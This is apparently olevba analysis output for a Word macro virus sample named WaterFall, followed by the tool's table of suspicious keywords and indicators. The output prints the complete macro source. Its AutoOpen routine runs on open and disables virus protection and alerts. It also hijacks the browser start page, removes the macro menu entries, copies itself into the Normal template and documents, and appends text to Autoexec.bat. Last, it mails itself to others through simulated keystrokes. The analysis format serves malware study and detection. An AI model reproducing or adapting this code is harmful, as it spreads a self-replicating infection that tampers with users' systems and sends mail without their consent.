olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.WaterFall
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.WaterFall - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO waterfall.bas 
in file: Virus.MSWord.Intended.WaterFall - OLE stream: 'Macros/VBA/waterfall'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
thinkerinstalled = False
Grudge = ActiveDocument
GrudgeInstalled = False
Thinker = NormalTemplate
For z = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(z).Name = "waterfall" Then
thinkerinstalled = True
End If
Next

For m = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(m).Name = "waterfall" Then
GrudgeInstalled = True
End If
   Next

If thinkerinstalled = False Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "Start Page") = "http://www.kevinmitnick.com"
CommandBars("tools").Controls("Templates and add-ins...").Delete
CommandBars("tools").Controls("Macro").Delete

End If

ToolsOptionsGeneral.SendMailAttach = 1
Application.VBE.ActiveVBProject.VBComponents("waterfall").Export "c:\waterf.dll"
If thinkerinstalled = False Then Set waterfallz = NormalTemplate.VBProject
If GrudgeInstalled = False Then Set waterfallz = ActiveDocument.VBProject
With waterfallz
With .VBComponents.Import("c:\waterf.dll")
End With
End With
  
If GrudgeInstalled = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

Reset
Kill "c:\waterf.dll"
Application.DisplayAlerts = wdAlertsAll
waterfall:



If (Month(Now)) = 12 And (Minute(Now)) = 12 Then
Open "c:\Autoexec.bat" For Append As 1
Print #1, "@echo off"
Print #1, "echo I have committed the sin of hacking and am unfit in the eyes of the Lord."
Print #1, "Echo I confess to acts of witchcraft and art, dissidence and voodoo."
Print #1, "Echo But in my Craft for which you condemn me,"
Print #1, "Echo I SURF THE BRAINWAVES OF GOD."
Reset
End If
Call autonomailer
End Sub

Sub autonomailer()
On Error Resume Next
If WordBasic.AppIsRunning("Internet Mail") Then
ActiveDocument.SaveAs FileName:="c:\doc1.doc", FileFormat:=wdFormatDocument, addtorecentfiles:=False
m$ = Application.UserName
WordBasic.AppActivate "Internet Mail"
WordBasic.SendKeys "%MN"
WordBasic.SendKeys "%MR"
WordBasic.SendKeys "%o"
WordBasic.SendKeys "{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{ENTER}"
WordBasic.SendKeys "{TAB}{TAB}"
WordBasic.SendKeys "Hey"
WordBasic.SendKeys "{TAB}"
WordBasic.SendKeys "Hey{ENTER}"
WordBasic.SendKeys "Youve just got to read this!{enter}"
WordBasic.SendKeys "Peace {enter}"
WordBasic.SendKeys m$
WordBasic.SendKeys "%IF"
WordBasic.SendKeys "c:\doc1.doc"
WordBasic.SendKeys "%A"
WordBasic.SendKeys "%FM"
WordBasic.SendKeys "^M"
End If

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.kevinmitn|URL                                          |
|          |ick.com             |                                             |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |waterf.dll          |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

